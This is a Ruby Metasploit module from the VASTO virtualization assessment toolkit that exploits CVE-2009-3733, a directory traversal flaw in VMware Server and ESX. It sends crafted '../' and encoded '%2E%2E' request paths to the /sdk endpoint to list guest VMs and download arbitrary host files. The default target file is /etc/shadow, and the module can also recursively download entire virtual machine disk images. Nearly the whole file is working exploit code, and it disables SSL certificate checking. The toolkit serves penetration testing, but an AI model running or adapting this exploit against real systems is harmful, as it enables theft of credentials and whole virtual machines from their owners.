#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################
require 'msf/core'
require "rexml/document"
require "open-uri"

class Metasploit3 < Msf::Auxiliary  
  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include REXML

  #Fixing invalid certificate complaints
  OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE if OpenSSL::SSL::VERIFY_PEER.nil?
  
  def initialize
    super(
			'Name'        => 'VMware Guest Stealer',
			'Version'     => '0.2',
			'Description' => 'This module exploits vulnerability CVE-2009-3733, reimplementing
					  the guest stealer exploit by Morehouse & Flick. Change the port
					  to 443 to get into an ESX server. Works on Linux hosts.',
			'Author'      => 'Claudio Criscione - c.criscione@securenetwork.it',
      			'References'	=>
				[
					[ 'URL', 'http://www.vmware.com/security/advisories/VMSA-2009-0015.html' ],
					[ 'OSVDB', '59440' ],	
					[ 'BID', '36842' ],
					[ 'CVE', '2009-3733' ],
					[ 'URL', 'http://fyrmassociates.com/tools/gueststealer-v1.1.pl' ]
				],
			'License'     =>  GPL_LICENSE 
    )
      
      deregister_options('VHOST')
      deregister_options('SSL')
      deregister_options('Proxies')
    register_options(
      [
        Opt::RPORT(8333),
        OptBool.new('SSL', [ true, "Use SSL", true ]),
	OptString.new('FILE', [true, "What you want to retrieve. If a vmx is given, the guest will be downloaded", "/etc/shadow"]),
	OptString.new('TARGET', [true, "Select ESX, Server or ESXi", "Server"]),
	OptString.new('LOCALDIR', [true, "Local directory where files are saved", "/tmp/"]),
        OptString.new('OPERATION', [true, "Set to FILE to download a file or guest or LIST to view the list of guests", "LIST"])
      ], Auxiliary::Scanner)    
  end
  
  def run_host(ip)
    begin
      operation = datastore['OPERATION']      
      case operation
      when "LIST" 
	do_list(ip)
      when "FILE"
	do_file(ip)       
      else 
	print_status("Unknown operation requested")
      end 	
    end
  end
  

    
    
   def do_list(ip)
      begin
	Opt::RHOST(ip)
        target = datastore['TARGET']
        uri = "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E"
	if( target == 'Server')
	    uri = "/sdk/../../../../../.."
	end
	uri << '/etc/vmware/hostd/vmInventory.xml'     
	
	res = send_request_raw({
	    'uri'	  => uri,
	    'method'  => 'GET',
	    'data'    => ""
	}, 25)
	
	print_status("Host is vulnerable and hosts the following guests")
	doc = Document.new(res.body)
	doc.elements.each("//vmxCfgPath") { |element| print_status element.text }
	
	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
	rescue ::Timeout::Error, ::Errno::EPIPE
      end
   end      

    
   #retrieves a given file or guest
   def do_file(ip)
     begin
        target = datastore['TARGET']
	ldir = datastore['LOCALDIR']
	port = datastore['RPORT']
	ssl = datastore['SSL']
	file = URI.escape(datastore['FILE'])
        
	
	#Building the url
	if(ssl)
	  @baseuri = 'https://'
	else
	  @baseuri = 'http://'
	end
	@baseuri << ip
	@baseuri << ':' + port
	if( target == 'Server')
	  @baseuri << "/sdk/../../../../../.."
	else
	  @baseuri << "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E" #encoding only if needed - ESX
	end	
	uri = @baseuri + file	
	

	#Go for the guest
	if(File.extname(uri) == '.vmx')
	  print_status("Downloading a Guest. Starting recursive download")
	  parent_path = file.split('/')[0..-2].join('/')
	  download_file(uri,ldir) #retrieving the file
	  ar = Array.new 
	  #Parsing the file looking for vmdk files
	  File.readlines(ldir + File.basename(uri)).each {|l| l.grep(/vmdk/).each {|r| 
	                                                                           print_status("Found disk #{r}")
	                                                                           diskname = /.*\"(.*)\".*/.match(r)
	                                                                           ar = ar << diskname[1] #pushing each found file into an array
	                                                                          } }
	  ar.uniq.each {|f| fname = @baseuri + parent_path + "/" +  URI.encode(f)  #retrieving the disks
			 download_file(fname,ldir)
			 #parsing the vmdk to retrieve more (actual) disks
	                 parse_vmdk(ldir + File.basename(fname),@baseuri,parent_path,ldir) 
	                }
	else  #no guest, just doiwnload the file
	  download_file(uri,ldir) 
	end
	
	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
	rescue ::Timeout::Error, ::Errno::EPIPE    
     end
   end
   
   
   
   #Download given file
   def download_file(uri,ldir)
     begin
	print_status("Dowloading file  " + uri + " to " + ldir)
	#Downloading the file
	open(uri, 
	     :content_length_proc => lambda {|t|
		if t && 0 < t
		  @size = t
	          @dstatus = 0
		end
	      },
	    :progress_proc => lambda {|s| #handling statusbar
		if((s*100 / @size) - 10  > @dstatus) #I love palindromes
		   @dstatus = (s*100 / @size)
		   print_status("#@dstatus % completed")
	       end
	     }
	  ) do |fin|
           open(ldir + URI.unescape(File.basename(uri)), "w") do |fout|
             while (buf = fin.read(8192))
               fout.write buf
             end
           end
         end
     end
   end
   
   
   
   #Recursively get more disks
   def parse_vmdk(file,baseuri,parent_path,ldir)
     begin
#	       l.grep(/VMFS/).each {print_status("VMFS disk detected, currently not supported")} #TODO
#	       l.grep(/SPARSE/).each {print_status("SPARSE disk detected, currently not supported")} #TODO
#	      l.grep(/parentFileNameHint/).each {print_status("PFNMH disk detected, currently not supported")} #TODO
       max_lines = 100 #parse at most max_lines
       cur_lines = 0
       file = URI.unescape(file)
       File.open( file ) do |f|
	    f.grep( /FLAT/ ) do |line| #Why not just .vmdk?
	      diskname = /.*\"(.*)\".*/.match(line) 
	      print_status("Identified a new disk: #{diskname[1]}")
	      fname = @baseuri + parent_path + "/" +  URI.encode(diskname[1])
	      download_file(fname,ldir)
	    end  
	 cur_lines += 1
	 if(cur_lines > max_lines) #if we reached max_lines we exit
	  return nil
	 end
       end	    
     end
   end
   
   
end